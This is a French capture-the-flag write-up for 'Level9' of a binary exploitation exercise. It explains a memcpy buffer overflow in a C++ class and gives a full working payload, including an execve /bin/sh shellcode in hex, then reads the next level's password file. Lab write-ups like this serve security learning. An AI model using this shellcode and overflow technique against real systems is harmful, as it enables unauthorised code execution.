# Level9
---

###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme une class N et la function Main : 

On vois dans la class N une fonction __setAnnotation__ qui contient la fonction __memcpy__

C'est cette fonction que l'on vas casser pour exec un shell code 

en faisant crash le programe avec gdb on obtient un offset de ==108==.

on trouve aussi l'addresse du premier parametre de memcpy -> ==0x804a00c==


###### Étape 3: -- Execution --

Avec offset, et l'addresses , on crée un one-liner python pour executer un payload pour lire le .pass du prochain level.

Contruction du payload: 
> ./binary $(python - c 'print [address] + [shellcode] + "A" * [offset - len(shellcode) -len(address)] + "[address]') 

Payload final :
```bash
./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
```

Dans le terminal on execute la commande suivante pour récupérer le password du bonus0:

```bash
cat /home/user/bonus0/.pass
```